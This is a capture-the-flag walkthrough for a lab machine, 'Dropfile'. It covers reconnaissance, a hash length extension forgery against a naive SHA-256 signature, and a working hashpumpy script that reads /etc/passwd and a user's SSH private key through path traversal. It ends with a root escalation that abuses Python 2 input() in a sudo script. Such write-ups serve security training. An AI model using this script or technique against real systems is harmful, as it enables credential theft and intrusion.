# Dropfile

## Enumeration&#x20;

### Nmap scan&#x20;

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 61:cb:9b:1b:e6:94:6e:aa:8a:2e:37:5c:94:67:d1:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD3/b8Oz6UXFvNDR0rB6nYUVzYvE1i3mRo86AIkCFth2mkFHUCu/0W/ar8F7iV9eV9lI+IXhTz2V2OFFqqardK4=
|   256 38:9c:00:19:fb:6e:98:d5:4f:c5:cf:89:02:83:4c:d6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA3MdXB0JsptyLZum5M2tEp3fly+WlWVl2fDtnJsYbn5
80/tcp open  http    syn-ack ttl 62 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://dropfile.hs/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
TCP/IP fingerprint:
```

### Port 80 - HTTP

The application leaked a specific domain name in the HTTP response; adding this domain to the local /etc/hosts file bypassed the initial connection restriction and granted access to the page.

<figure><img src="../.gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>

I registered a new account on the discovered page, which successfully authenticated and granted me access to the internal dashboard.

<figure><img src="../.gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (301).png" alt=""><figcaption></figcaption></figure>

Conducted subdomain enumeration against the target domain and discovered an active development environment at dev.dropfile.hs

<figure><img src="../.gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>

Navigated to the /explore directory and discovered a public administrator repository containing app.py, which exposed the full backend Python source code for the application.

<figure><img src="../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>

Analysis of app.py revealed that generate\_signature naively concatenates the secret and data (secret + data) using a simple SHA-256 hash instead of a secure HMAC construct, making the application vulnerable to a Length Extension Attack

<figure><img src="../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>

Navigated to /api/files after uploading a test file and discovered a public JSON endpoint leaking detailed metadata, including full server disk paths (uploads/2\_dragon.php.jpg) and valid file signatures for all stored uploads.

<figure><img src="../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>

Visiting the /share/file\_2 endpoint revealed a structured JSON response exposing a direct download URL complete with the specific file name and its valid cryptographic signature

<figure><img src="../.gitbook/assets/image (307).png" alt=""><figcaption></figcaption></figure>

The /download endpoint authenticates file requests using a custom signature scheme (SHA256(SECRET\_KEY + filename)) instead of a proper HMAC, making it vulnerable to a hash length extension attack. Using a legitimately obtained (filename, signature) pair from the /share endpoint, we brute-forced the SECRET\_KEY length (16 bytes) and used hashpumpy to forge a valid signature for an attacker-controlled path (../../etc/passwd), bypassing the signature check with no knowledge of the actual secret.



Wrote a Python script using hashpumpy to automate the attack for each SECRET\_KEY length (1–64 bytes), it called hashpumpy.hashpump(signature, filename, "/../../etc/passwd", keylen) to generate a forged signature and padded filename, then sent it to /download?filename=...\&sig=... and checked the response. A 403 indicated an incorrect key length; a 200 with file contents confirmed the correct length (16 bytes) and successful forgery.

```
import hashpumpy
import urllib.request
import urllib.error
import urllib.parse

BASE = "http://dropfile.hs"
COOKIE = "session=eyJ1c2VyX2lkIjoiam9rZXIifQ.auTXnA.dHsOakM-1LSeIV9sUVtRpf7Z2GY"

original_message = b"2_dragon.php.jpg"
original_sig = "6df79cc974ff822b1d80c834ce8da76e35842b0e2a770d4505bb026a941fa7b9"
append_data = b"/../../etc/passwd"

for keylen in range(1, 65):
    new_sig, new_message = hashpumpy.hashpump(
        original_sig,
        original_message,
        append_data,
        keylen
    )

    encoded_filename = urllib.parse.quote_from_bytes(new_message)
    url = f"{BASE}/download?filename={encoded_filename}&sig={new_sig}"

    req = urllib.request.Request(url, headers={"Cookie": COOKIE})

    try:
        resp = urllib.request.urlopen(req)
        print(keylen, resp.status, resp.read()[:300])
        print(f"[+] SUCCESS at keylen={keylen}")
        break
    except urllib.error.HTTPError as e:
        body = e.read()
        if e.code != 403:
            print(keylen, e.code, body[:200])
        else:
            print(keylen, 403)
```

<figure><img src="../.gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>

On line 28 of the script change the number to 4000 or 5000 to&#x20;

Found a user called ravi in /etc/passwd&#x20;

<figure><img src="../.gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>

Modified the length extension payload to request the private SSH key (id\_rsa) of user ravi, allowing the file to be read via the vulnerable download endpoint and subsequently saved locally to gain persistent access.

<figure><img src="../.gitbook/assets/image (312).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>

### Port 22 - SSH

Initial access as user ravi&#x20;

<figure><img src="../.gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>



Found user.txt on users home directory&#x20;

<div align="left"><figure><img src="../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure></div>

### Privilege Escalation&#x20;

Running sudo -l revealed that user ravi can execute a Python 2.7 script (/opt/backup.py) as root without a password. Because the script utilizes the unsafe input() function in Python 2, can abuse it to inject arbitrary Python code during the confirmation prompt to escalate privileges to root.

<figure><img src="../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>







